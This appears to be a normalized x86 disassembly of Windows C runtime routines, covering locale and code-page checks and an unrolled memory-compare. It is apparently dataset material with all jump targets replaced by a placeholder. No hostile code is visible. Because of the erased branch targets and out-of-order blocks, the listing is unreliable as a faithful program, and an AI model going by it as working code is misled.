jmp r-xdata
push edi
push 0x40
push r--data
call sub_444439
add esp 0xc
test eax eax
je r-xdata
mov esi edi
call sub_444923
jmp r-xdata
movzx eax si
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
mov ebx [ ebx ]
test ebx ebx
je r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
push 0x1
push [ edi + 0x18 ]
call [ IsValidLocale@IAT ]
test eax eax
je r-xdata
mov esi edi
call sub_44498a
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov esi edi
call sub_444923
jmp r-xdata
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
mov cx [ edi + 0x18 ]
mov [ eax ] cx
mov cx [ edi + 0x1c ]
mov [ eax + 0x2 ] cx
mov [ eax + 0x4 ] si
xor eax eax
inc eax
jmp r-xdata
mov esi [ GetLocaleInfoA@IAT ]
mov ecx 0x814
cmp [ eax ] cx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push 0x40
push ebx
push 0x1001
push [ edi + 0x18 ]
call esi
test eax eax
je r-xdata
push r--data
push 0x40
push ebx
call sub_43f118
add esp 0xc
test eax eax
je r-xdata
push 0x40
lea eax [ ebx + 0x40 ]
push eax
push 0x1002
push [ edi + 0x1c ]
call esi
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_43f873
push 0xa
push 0x10
sub ebx 0xffffff80
push ebx
push [ ebp + 0x8 ]
call sub_43dc9d
add esp 0x10
sub_444bb7
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
mov eax edi
sub eax 0x0
je r-xdata
xor eax eax
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
movzx eax [ eax ]
movzx ecx [ ecx ]
jmp r-xdata
dec eax
je r-xdata
sub eax ecx
je r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
dec eax
je r-xdata
pop edi
pop esi
pop ebp
retn
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
jmp r-xdata
movzx eax [ ecx + 0x1 ]
movzx ecx [ esi + 0x1 ]
jmp r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
dec eax
je r-xdata
movzx eax [ ecx + 0x1 ]
movzx edx [ esi + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push ebx
push 0x20
pop edx
jmp r-xdata
movzx eax [ ecx + 0x2 ]
movzx ecx [ esi + 0x2 ]
jmp r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
movzx eax [ ecx + 0x1 ]
movzx edx [ esi + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
cmp edi edx
jae r-xdata
movzx eax [ ecx + 0x2 ]
movzx edx [ esi + 0x2 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
mov esi [ eax ]
cmp esi [ ecx ]
je r-xdata
add eax edi
add ecx edi
cmp edi 0x1f
ja r-xdata
movzx eax [ ecx + 0x3 ]
movzx ecx [ esi + 0x3 ]
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
xor esi esi
movzx esi [ eax ]
movzx ebx [ ecx ]
sub esi ebx
je r-xdata
xor eax eax
jmp [ edi * 4 + jump_table_44608b ]
mov eax esi
jmp r-xdata
mov esi [ eax + 0x4 ]
cmp esi [ ecx + 0x4 ]
je r-xdata
movzx esi [ eax + 0x1 ]
movzx ebx [ ecx + 0x1 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
mov edx [ eax - 0x1c ]
cmp edx [ ecx - 0x1c ]
je r-xdata
mov edx [ eax - 0x18 ]
cmp edx [ ecx - 0x18 ]
je r-xdata
mov edx [ eax - 0x14 ]
cmp edx [ ecx - 0x14 ]
je r-xdata
mov edx [ eax - 0x10 ]
cmp edx [ ecx - 0x10 ]
je r-xdata
mov edx [ eax - 0xc ]
cmp edx [ ecx - 0xc ]
je r-xdata
mov edx [ eax - 0x8 ]
cmp edx [ ecx - 0x8 ]
je r-xdata
mov edx [ eax - 0x4 ]
cmp edx [ ecx - 0x4 ]
je r-xdata
mov edx [ eax - 0x1d ]
cmp edx [ ecx - 0x1d ]
je r-xdata
mov edx [ eax - 0x19 ]
cmp edx [ ecx - 0x19 ]
je r-xdata
mov edx [ eax - 0x15 ]
cmp edx [ ecx - 0x15 ]
je r-xdata
mov edx [ eax - 0x11 ]
cmp edx [ ecx - 0x11 ]
je r-xdata
mov edx [ eax - 0xd ]
cmp edx [ ecx - 0xd ]
je r-xdata
mov edx [ eax - 0x9 ]
cmp edx [ ecx - 0x9 ]
je r-xdata
mov edx [ eax - 0x5 ]
cmp edx [ ecx - 0x5 ]
je r-xdata
movzx ecx [ ecx - 0x1 ]
movzx eax [ eax - 0x1 ]
sub eax ecx
je r-xdata
mov edx [ eax - 0x1e ]
cmp edx [ ecx - 0x1e ]
je r-xdata
mov edx [ eax - 0x1a ]
cmp edx [ ecx - 0x1a ]
je r-xdata
mov edx [ eax - 0x16 ]
cmp edx [ ecx - 0x16 ]
je r-xdata
mov edx [ eax - 0x12 ]
cmp edx [ ecx - 0x12 ]
je r-xdata
mov edx [ eax - 0xe ]
cmp edx [ ecx - 0xe ]
je r-xdata
mov edx [ eax - 0xa ]
cmp edx [ ecx - 0xa ]
je r-xdata
mov edx [ eax - 0x6 ]
cmp edx [ ecx - 0x6 ]
je r-xdata
mov dx [ eax - 0x2 ]
cmp dx [ ecx - 0x2 ]
je r-xdata
mov edx [ eax - 0x1f ]
cmp edx [ ecx - 0x1f ]
je r-xdata
mov edx [ eax - 0x1b ]
cmp edx [ ecx - 0x1b ]
je r-xdata
mov edx [ eax - 0x17 ]
cmp edx [ ecx - 0x17 ]
je r-xdata
mov edx [ eax - 0x13 ]
cmp edx [ ecx - 0x13 ]
je r-xdata
mov edx [ eax - 0xf ]
cmp edx [ ecx - 0xf ]
je r-xdata
mov edx [ eax - 0xb ]
cmp edx [ ecx - 0xb ]
je r-xdata
mov edx [ eax - 0x7 ]
cmp edx [ ecx - 0x7 ]
je r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
pop ebx
jmp r-xdata
xor esi esi
movzx esi [ eax + 0x4 ]
movzx ebx [ ecx + 0x4 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x2 ]
movzx ebx [ ecx + 0x2 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xc ]
movzx esi [ eax - 0xc ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor eax eax
movzx esi dl
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0x9 ]
movzx esi [ eax - 0x9 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
jmp r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1e ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xa ]
movzx esi [ eax - 0xa ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
movzx edx [ ecx - 0x2 ]
movzx esi [ eax - 0x2 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0x1f ]
movzx esi [ eax - 0x1f ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xf ]
movzx esi [ eax - 0xf ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
je r-xdata
mov esi [ eax + 0x8 ]
cmp esi [ ecx + 0x8 ]
je r-xdata
movzx esi [ eax + 0x5 ]
movzx ebx [ ecx + 0x5 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x3 ]
movzx ebx [ ecx + 0x3 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x7 ]
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x8 ]
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1d ]
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx edx [ ecx - 0x9 ]
movzx esi [ eax - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
movzx esi [ eax - 0x1e ]
movzx edx [ ecx - 0x1e ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
mov eax edx
jmp r-xdata
xor esi esi
movzx esi [ eax + 0x8 ]
movzx ebx [ ecx + 0x8 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x6 ]
movzx ebx [ ecx + 0x6 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x2 ]
movzx edx [ ecx - 0x2 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
mov eax edx
jmp r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x7 ]
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx edx [ ecx - 0x8 ]
movzx esi [ eax - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
jmp r-xdata
movzx esi [ eax - 0x1d ]
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x9 ]
movzx edx [ ecx - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
mov esi [ eax + 0xc ]
cmp esi [ ecx + 0xc ]
je r-xdata
movzx esi [ eax + 0x9 ]
movzx ebx [ ecx + 0x9 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x7 ]
movzx ebx [ ecx + 0x7 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x9 ]
movzx edx [ ecx - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
sub eax ecx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
je r-xdata
test eax eax
jne r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x2 ]
movzx edx [ ecx - 0x2 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx edx [ ecx - 0x7 ]
movzx esi [ eax - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x8 ]
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0xc ]
movzx ebx [ ecx + 0xc ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0xa ]
movzx ebx [ ecx + 0xa ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
